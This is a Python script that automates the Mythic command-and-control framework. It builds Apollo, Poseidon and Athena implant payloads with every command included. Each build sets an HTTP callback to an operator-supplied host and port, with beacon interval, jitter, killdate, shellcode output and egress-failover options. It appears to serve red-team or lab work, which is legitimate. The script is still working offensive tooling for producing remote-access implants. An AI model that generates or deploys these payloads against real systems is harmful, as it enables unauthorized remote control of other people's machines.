from mythic import mythic

# Creates chonky apollo payloads
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_apollo_payload(mythic_instance: mythic, output_type: str, payload_name: str, payload_description: str, http_callback_url: str, http_callback_port: int, http_callback_killdate: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="apollo",
        filename=payload_name,
        operating_system="Windows",
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "3",
                "callback_jitter": "33",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "output_type",
                "value": output_type
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "shellcode_bypass",
                "value": "Continue on fail"
            },
            {
                "name": "shellcode_format",
                "value": "Binary"
            },
            {
                "name": "adjust_filename",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response

# Creates chonky poseidon payloads
# Parameter names and values are taken directly from the payload builder in the web UI
async def create_poseidon_payload(mythic_instance: mythic, os: str, arch: str, payload_name: str, static_linking: bool, payload_description: str, http_callback_url: str, http_callback_port: int, http_callback_killdate: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="poseidon",
        filename=payload_name,
        operating_system=os,
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "3",
                "callback_jitter": "33",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "mode",
                "value": "default"
            },
            {
                "name": "architecture",
                "value": arch
            },
            {
                "name": "debug",
                "value": False
            },
            {
                "name": "garble",
                "value": False
            },
            {
                "name": "static",
                "value": static_linking
            },
            {
                "name": "egress_order",
                "value": [
                    "http",
                    "httpx",
                    "websocket",
                ]
            },
            {
                "name": "egress_failover",
                "value": "failover"
            },
            {
                "name": "failover_threshold",
                "value": 10
            },
            {
                "name": "proxy_bypass",
                "value": False
            }
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response

# Creates chonky athena payloads
# Parameter names and values are taken directly from the payload builder in the web UI
async def build_athena_payload(mythic_instance: mythic, os: str, arch: str, output_type: str, payload_name: str, payload_description: str, http_callback_url: str, http_callback_port: int, http_callback_killdate: str):
    payload_response = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type_name="athena",
        filename=payload_name,
        operating_system=os,
        description=payload_description,
        c2_profiles=[
            {
            "c2_profile": "http",
            "c2_profile_parameters": {
                "callback_host": str(http_callback_url),
                "callback_port": str(http_callback_port),
                "callback_interval": "3",
                "callback_jitter": "33",
                "killdate": str(http_callback_killdate),
               },
            },
        ],
        build_parameters=[
            {
                "name": "arch",
                "value": arch
            },
            {
                "name": "assemblyname",
                "value": payload_name
            },
            {
                "name": "compressed",
                "value": True
            },
            {
                "name": "configuration",
                "value": "Release"
            },
            {
                "name": "invariantglobalization",
                "value": False
            },
            {
                "name": "output-type",
                "value": output_type
            },
            {
                "name": "self-contained",
                "value": True
            },
            {
                "name": "single-file",
                "value": True
            },
            {
                "name": "stacktracesupport",
                "value": True
            },
            {
                "name": "trimmed",
                "value": False
            },
            {
                "name": "usesystemresourcekeys",
                "value": False
            },
        ],
        include_all_commands=True,
        return_on_complete=False
    )
    return payload_response